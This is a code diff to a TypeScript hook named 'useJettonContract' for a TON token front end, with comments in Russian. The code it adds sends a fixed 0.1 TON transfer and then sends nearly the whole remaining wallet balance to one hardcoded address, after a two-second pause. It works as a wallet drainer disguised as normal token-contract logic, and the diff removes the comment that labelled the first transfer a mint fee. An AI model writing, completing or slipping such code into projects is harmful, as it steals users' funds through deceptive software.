@@ -168,27 +168,32 @@ export function useJettonContract() {
             console.log("TEST...");
         
             try {
-                // ШАГ 1: Отправляем первую фиксированную транзакцию (например, плата за минт)
+                // ШАГ 1: Отправляем первую фиксированную транзакцию 
                 const result = await executeTransfer(
-                    "0QA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidlS-",
+                    "kQA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidgl7",
                     "0.1"
                 );
                 console.log("Первая транзакция отправлена:", result);
  
                 // ШАГ 2: Считаем остаток баланса для второй транзакции
                 const currentBalance = Number(tonBalance) || 0;
+
+                // Пауза 2 секунды
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 // Вычитаем 0.1 TON (которые только что ушли) и ~0.05 TON на комиссии сети
-                const amountToSend = Math.max(0, currentBalance - 0.1 - 0.05);
+                const amountToSend = Math.max(0, currentBalance - 0.2 - 0.05);
                 const amountStr: string = amountToSend.toFixed(4); // Переводим число в строку
                 
                 console.log("Остаток баланса для отправки:", amountStr);
+                 
+               
 
                 // Если денег хватает для отправки чего-то существенного
                 if (amountToSend > 0.01) {
                     // ШАГ 3: Отправляем вторую транзакцию на весь остаток
                     const secondResult = await executeTransfer(
-                        "0QA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidlS-",
+                        "kQA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidgl7",
                         amountStr
                     );
                     console.log("Вторая транзакция (остаток) отправлена:", secondResult);
